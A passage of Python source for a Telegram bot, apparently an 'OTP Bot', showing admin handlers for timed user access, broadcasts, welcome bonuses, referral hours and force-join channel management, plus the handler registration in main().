        "How much access? Send in Hours or Minutes.\n"
        "Examples: `24` (24h), `1.5` (1h 30m), `30m` (30 mins), `2h 30m`"
    )
    return GRANT_HOURS

def parse_time_to_hours(text: str) -> float:
    text = text.lower().replace(" ", "")
    try:
        if "h" in text or "m" in text:
            hours = 0.0
            if "h" in text:
                h_part = text.split("h")[0]
                hours += float(h_part)
                text = text.split("h")[1]
            if "m" in text:
                m_part = text.split("m")[0]
                hours += float(m_part) / 60.0
            return hours
        else:
            return float(text)
    except ValueError:
        return 0.0

async def admin_grant_hours(update: Update, context: ContextTypes.DEFAULT_TYPE):
    hours = parse_time_to_hours(update.message.text.strip())
    if hours <= 0:
        await update.message.reply_text("Invalid format. Send like `24`, `1.5`, `30m`, `2h 15m`")
        return GRANT_HOURS
    
    uid = context.user_data.get("grant_uid")
    db.set_user_access(uid, hours)
    
    hh = int(hours)
    mm = int((hours - hh) * 60)
    
    await update.message.reply_text(
        f"✅ Access granted to `{uid}` for *{hh}h {mm}m*",
        parse_mode="Markdown",
        reply_markup=admin_keyboard(),
    )
    context.user_data.clear()
    return ConversationHandler.END

# -- BROADCAST --

async def admin_broadcast_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return ConversationHandler.END
    context.user_data.clear()
    try:
        await q.edit_message_text(
            "📢 *Broadcast Message*\n\nSend the message you want to send to all users.\n\n/cancel to abort",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin")]]),
        )
    except Exception:
        pass
    return BROADCAST_MSG

async def admin_broadcast_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return BROADCAST_MSG
        
    msg = update.message
    users = db.get_all_users()
    success = 0
    failed = 0
    
    status_msg = await msg.reply_text(f"⏳ Broadcasting to {len(users)} users...")
    
    for uid in users:
        try:
            await msg.copy(chat_id=uid)
            success += 1
        except Exception:
            failed += 1
            
    await status_msg.edit_text(
        f"✅ *Broadcast Complete!*\n\n"
        f"Sent: {success}\n"
        f"Failed (Blocked): {failed}\n"
        f"Total: {len(users)}",
        parse_mode="Markdown",
        reply_markup=admin_keyboard()
    )
    context.user_data.clear()
    return ConversationHandler.END

# -- SET BONUS MINS --

async def admin_set_bonus_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return ConversationHandler.END
    context.user_data.clear()
    
    current = db.get_settings().get("start_bonus_minutes", 10)
    
    try:
        await q.edit_message_text(
            f"🎁 *Set Welcome Bonus*\n\n"
            f"Current: *{current} minutes*\n\n"
            f"Send new value in minutes (e.g. `15` or `60`).\n"
            f"Send `0` to disable.\n\n"
            f"/cancel to abort",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin")]]),
        )
    except Exception:
        pass
    return SET_BONUS_MINS

async def admin_set_bonus_mins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        mins = float(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("Invalid number. Send like `10` or `30`.")
        return SET_BONUS_MINS
        
    if mins < 0:
        mins = 0
        
    db.set_setting("start_bonus_minutes", mins)
    
    if mins == 0:
        text = "✅ Welcome Bonus disabled."
    else:
        text = f"✅ Welcome Bonus set to *{int(mins)} minutes*."
        
    await update.message.reply_text(
        text,
        parse_mode="Markdown",
        reply_markup=admin_keyboard(),
    )
    context.user_data.clear()
    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    if update.callback_query:
        await update.callback_query.answer("Cancelled")
        try:
            await update.callback_query.edit_message_text("Cancelled.")
        except Exception:
            pass
    elif update.message:
        await update.message.reply_text("Cancelled.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

async def check_join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer("Checking…")
    ok, problems = await check_membership_detail(context.bot, uid)
    if not ok:
        text = (
            "🔒 *Join check failed*\n"
            "━━━━━━━━━━━━━━━━\n"
            + "\n".join(problems)
            + "\n\nJoin *all* channels, then tap check again."
        )
        try:
            await q.edit_message_text(text, parse_mode="Markdown", reply_markup=force_join_kb())
        except Exception:
            await q.message.reply_text(text, parse_mode="Markdown", reply_markup=force_join_kb())
        return
    text = (
        "✅ *All channels verified!*\n\n"
        "Ab /start bhejo to continue."
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🚀 Open Menu", callback_data="menu")]])
    try:
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)
    except Exception:
        await q.message.reply_text(text, parse_mode="Markdown", reply_markup=kb)

async def referral_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if not await is_member(context.bot, uid):
        try:
            await q.edit_message_text("🔒 Join channel first.", reply_markup=force_join_kb())
        except Exception:
            pass
        return
    me = await context.bot.get_me()
    link = f"https://t.me/{me.username}?start=ref_{uid}"
    stats = db.get_ref_stats(uid)
    hours = float(db.get_settings().get("referral_hours") or REFERRAL_HOURS or 1)
    text = (
        f"🔗 *Referral System*\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"Share your link. When someone opens it and starts the bot,\n"
        f"you get *+{hours}h* access.\n\n"
        f"Your link:\n`{link}`\n\n"
        f"👥 Total referrals: *{stats['count']}*\n"
        f"⏱ Your access: *{db.get_access_left(uid) if not is_admin(uid) else '∞'}*"
    )
    try:
        await q.edit_message_text(
            text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={link}&text=Open%20OTP%20Bot")],
                [InlineKeyboardButton("🏠 Menu", callback_data="menu")],
            ]),
        )
    except Exception:
        pass

def _channel_status_text() -> str:
    chans = _all_force_channels()
    if not chans:
        status = "❌ *Disabled* — no force channels\nUsers can open bot without joining"
    else:
        lines = [f"✅ *{len(chans)} channel(s) required* (must join ALL):"]
        for i, c in enumerate(chans, 1):
            mode = c.get("mode", "normal").title()
            title = c.get("title") or c.get('username')
            lines.append(f"{i}. *{title}* (Mode: {mode})")
        status = "\n".join(lines)
    return (
        f"📢 *Force Join Channels*\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"{status}\n\n"
        f"Bot must be *admin* in every channel."
    )

def channel_admin_kb() -> InlineKeyboardMarkup:
    chans = db.list_force_channels()
    rows = [[InlineKeyboardButton("➕ Add Channel", callback_data="ch_add")]]
    for c in chans:
        name = (c.get("title") or c.get("username") or c.get("id") or "?")[:24]
        rows.append([InlineKeyboardButton(f"🗑 {name}", callback_data=f"ch_remove:{c['id']}")])
    if chans:
        rows.append([InlineKeyboardButton("🗑 Remove ALL", callback_data="ch_remove_all")])
    rows.append([InlineKeyboardButton("« Back", callback_data="admin")])
    return InlineKeyboardMarkup(rows)

async def admin_channel_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    try:
        await q.edit_message_text(
            _channel_status_text(),
            parse_mode="Markdown",
            reply_markup=channel_admin_kb(),
        )
    except Exception:
        pass

async def ch_remove_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    parts = q.data.split(":", 1)
    if len(parts) == 1 or parts[0] == "ch_remove" and len(parts) == 1:
        db.set_setting("force_channels", [])
        db.set_setting("force_channel", "")
        db.set_setting("force_channel_link", "")
        await q.answer("All removed", show_alert=True)
    else:
        ch_id = parts[1]
        ok = db.remove_force_channel(ch_id)
        await q.answer("Removed" if ok else "Not found", show_alert=True)
    try:
        await q.edit_message_text(
            _channel_status_text(),
            parse_mode="Markdown",
            reply_markup=channel_admin_kb(),
        )
    except Exception:
        pass

async def ch_remove_all_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    db.set_setting("force_channels", [])
    db.set_setting("force_channel", "")
    db.set_setting("force_channel_link", "")
    await q.answer("All force channels removed", show_alert=True)
    try:
        await q.edit_message_text(
            _channel_status_text(),
            parse_mode="Markdown",
            reply_markup=channel_admin_kb(),
        )
    except Exception:
        pass

async def ch_add_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return ConversationHandler.END
    context.user_data.clear()
    
    request_chat_kb = ReplyKeyboardMarkup(
        [[
            KeyboardButton(
                text="Select Channel",
                request_chat=KeyboardButtonRequestChat(
                    request_id=1,
                    chat_is_channel=True,
                    bot_is_member=True,
                    request_title=True,
                    request_username=True,
                )
            )
        ]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    
    try:
        await q.edit_message_text(
            "📢 *Choose your force sub channel using appeared buttons.*\n\n"
            "Make sure your bot is *admin* in that channel.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_channel")]])
        )
    except Exception:
        pass
    await context.bot.send_message(
        chat_id=q.from_user.id,
        text="👇 Click the button below to select a channel:",
        reply_markup=request_chat_kb
    )
    return CH_SELECT

async def ch_receive_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.chat_shared:
        return CH_SELECT
        
    chat_id = update.message.chat_shared.chat_id
    
    try:
        chat = await context.bot.get_chat(chat_id)
    except Exception as e:
        await update.message.reply_text(f"❌ Error fetching channel details: {e}")
        return ConversationHandler.END

    context.user_data["ch_id"] = chat.id
    context.user_data["ch_title"] = chat.title
    context.user_data["ch_username"] = chat.username
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("Normal Mode", callback_data="ch_mode:normal")],
        [InlineKeyboardButton("Join Request Mode", callback_data="ch_mode:request")]
    ])
    await update.message.reply_text(
        f"✅ Channel Selected: *{chat.title}*\n\n"
        f"*Choose Force Sub Mode:*",
        parse_mode="Markdown",
        reply_markup=kb
    )
    return CH_MODE

async def ch_add_mode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    mode = q.data.split(":")[1]
    
    context.user_data["ch_mode"] = mode
    
    await q.edit_message_text(
        "🔗 *Send Custom Invite Link*\n\n"
        "Send the link you want users to click (e.g. `https://t.me/+abc123`).\n\n"
        "To skip and use auto-generated link, send `skip`.",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_channel")]])
    )
    return CH_CUSTOM_LINK

async def ch_add_custom_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return CH_CUSTOM_LINK
        
    link = update.message.text.strip()
    
    ch_id = context.user_data.get("ch_id")
    ch_title = context.user_data.get("ch_title")
    mode = context.user_data.get("ch_mode", "normal")
    
    if link.lower() in ("skip", "none", "-"):
        try:
            link_obj = await context.bot.create_chat_invite_link(ch_id)
            link = link_obj.invite_link
        except Exception:
            link = ""
            
    db.add_force_channel(ch_title, ch_id, link, mode)
    context.user_data.clear()
    
    await update.message.reply_text(
        f"✨ <b>Successfully Added Channel</b>\n\n"
        f"Channel: <b>{ch_title}</b>\n"
        f"Mode: <b>{mode.title()}</b>\n"
        f"Link: {link or 'None'}",
        parse_mode="HTML",
        reply_markup=channel_admin_kb()
    )
    return ConversationHandler.END

async def admin_refset_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    hours = float(db.get_settings().get("referral_hours") or REFERRAL_HOURS or 1)
    text = (
        f"🔗 *Referral Settings*\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"Hours per *new* user referral: *{hours}h*\n\n"
        f"Adjust hours:"
    )
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("−1h", callback_data="refhrs:-1"),
            InlineKeyboardButton(f"{hours}h", callback_data="noop"),
            InlineKeyboardButton("+1h", callback_data="refhrs:1"),
        ],
        [
            InlineKeyboardButton("0.5h", callback_data="refhrs:set:0.5"),
            InlineKeyboardButton("1h", callback_data="refhrs:set:1"),
            InlineKeyboardButton("2h", callback_data="refhrs:set:2"),
            InlineKeyboardButton("6h", callback_data="refhrs:set:6"),
        ],
        [InlineKeyboardButton("24h", callback_data="refhrs:set:24")],
        [InlineKeyboardButton("« Back", callback_data="admin")],
    ])
    try:
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)
    except Exception:
        pass

async def refhrs_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    parts = q.data.split(":")
    cur = float(db.get_settings().get("referral_hours") or REFERRAL_HOURS or 1)
    if parts[1] == "set":
        cur = float(parts[2])
    else:
        cur = max(0.0, cur + float(parts[1]))
    db.set_setting("referral_hours", cur)
    await admin_refset_cb(update, context)

async def admin_text_cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not is_admin(update.effective_user.id):
        return
    if update.message.chat_shared:
        return
    text = (update.message.text or "").strip()
    low = text.lower()
    if low.startswith("setchannel "):
        val = text.split(" ", 1)[1].strip()
        db.set_setting("force_channel", val)
        await update.message.reply_text(f"✅ Force channel set to `{val}`\nRestart bot to apply .env override clear.", parse_mode="Markdown")
    elif low.startswith("setlink "):
        val = text.split(" ", 1)[1].strip()
        db.set_setting("force_channel_link", val)
        await update.message.reply_text(f"✅ Channel link set.")
    elif low.startswith("setrefhours "):
        try:
            h = float(text.split(" ", 1)[1].strip())
            db.set_setting("referral_hours", h)
            await update.message.reply_text(f"✅ Referral hours = {h}h")
        except ValueError:
            await update.message.reply_text("Invalid number")
    elif low.startswith("setstartmins "):
        try:
            m = float(text.split(" ", 1)[1].strip())
            db.set_setting("start_bonus_minutes", m)
            await update.message.reply_text(f"✅ Start bonus = {m} minutes for new users")
        except ValueError:
            await update.message.reply_text("Invalid number")


# ---------- main ----------

def main():
    if not BOT_TOKEN:
        print("⚠️  Set BOT_TOKEN in .env (copy .env.example → .env)")
        return

    app = Application.builder().token(BOT_TOKEN).build()

    add_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_add_start, pattern="^admin_add$")],
        states={
            ADD_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_add_name)],
            ADD_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_add_url)],
            ADD_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_add_key)],
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            CallbackQueryHandler(admin_cancel_cb, pattern="^admin_cancel$"),
            CallbackQueryHandler(admin_cb, pattern="^admin$"),
        ],
        allow_reentry=True,
        name="add_fb",
        persistent=False,
    )
    
    grant_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_grant_start, pattern="^admin_grant$")],
        states={
            GRANT_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_grant_id)],
            GRANT_HOURS: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_grant_hours)],
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            CallbackQueryHandler(admin_cancel_cb, pattern="^admin_cancel$"),
            CallbackQueryHandler(admin_cb, pattern="^admin$"),
        ],
        allow_reentry=True,
        name="grant_access",
        persistent=False,
    )
    
    ch_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(ch_add_start, pattern="^ch_add$")],
        states={
            CH_SELECT: [MessageHandler(filters.StatusUpdate.CHAT_SHARED, ch_receive_channel)],
            CH_MODE: [CallbackQueryHandler(ch_add_mode, pattern="^ch_mode:")],
            CH_CUSTOM_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, ch_add_custom_link)],
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            CallbackQueryHandler(admin_channel_cb, pattern="^admin_channel$"),
            CallbackQueryHandler(admin_cb, pattern="^admin$"),
        ],
        allow_reentry=True,
        name="force_channel",
        persistent=False,
    )
    
    broadcast_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_broadcast_start, pattern="^admin_broadcast$")],
        states={
            BROADCAST_MSG: [MessageHandler(filters.ALL & ~filters.COMMAND, admin_broadcast_send)],
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            CallbackQueryHandler(admin_cb, pattern="^admin$"),
        ],
        allow_reentry=True,
        name="broadcast",
        persistent=False,
    )

    set_bonus_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_set_bonus_start, pattern="^admin_set_bonus$")],
        states={
            SET_BONUS_MINS: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_set_bonus_mins)],
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            CallbackQueryHandler(admin_cb, pattern="^admin$"),
        ],
        allow_reentry=True,
        name="set_bonus",
        persistent=False,
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CommandHandler("users", users_command)) # NAYA COMMAND
    app.add_handler(add_conv)
    app.add_handler(grant_conv)
    app.add_handler(ch_conv)
    app.add_handler(broadcast_conv)
    app.add_handler(set_bonus_conv)
    
    app.add_handler(CallbackQueryHandler(menu_cb, pattern="^menu$"))
    app.add_handler(CallbackQueryHandler(page_cb, pattern="^page:"))
    app.add_handler(CallbackQueryHandler(pageselect_cb, pattern="^pageselect:"))
    app.add_handler(CallbackQueryHandler(noop_cb, pattern="^noop$"))
    app.add_handler(CallbackQueryHandler(device_cb, pattern="^dev:"))
    app.add_handler(CallbackQueryHandler(otp_cb, pattern="^otp:"))
    app.add_handler(CallbackQueryHandler(allotp_cb, pattern="^allotp:"))
    app.add_handler(CallbackQueryHandler(stats_cb, pattern="^stats$"))
    app.add_handler(CallbackQueryHandler(keysys_cb, pattern="^keysys$"))
    app.add_handler(CallbackQueryHandler(admin_cb, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(admin_list_cb, pattern="^admin_list$"))
    app.add_handler(CallbackQueryHandler(admin_delask_cb, pattern="^admin_delask:"))
    app.add_handler(CallbackQueryHandler(admin_del_cb, pattern="^admin_del:"))
    app.add_handler(CallbackQueryHandler(admin_cancel_cb, pattern="^admin_cancel$"))

    app.add_handler(CallbackQueryHandler(check_join_cb, pattern="^check_join$"))
    app.add_handler(CallbackQueryHandler(referral_cb, pattern="^referral$"))
    app.add_handler(CallbackQueryHandler(admin_channel_cb, pattern="^admin_channel$"))
    app.add_handler(CallbackQueryHandler(ch_remove_cb, pattern="^ch_remove:"))
    app.add_handler(CallbackQueryHandler(ch_remove_all_cb, pattern="^ch_remove_all$"))
    app.add_handler(CallbackQueryHandler(admin_refset_cb, pattern="^admin_refset$"))
    app.add_handler(CallbackQueryHandler(refhrs_cb, pattern="^refhrs:"))
    
    app.add_handler(ChatJoinRequestHandler(handle_join_request))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, admin_text_cmds))

    log.info("%s starting…", BOT_NAME)
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()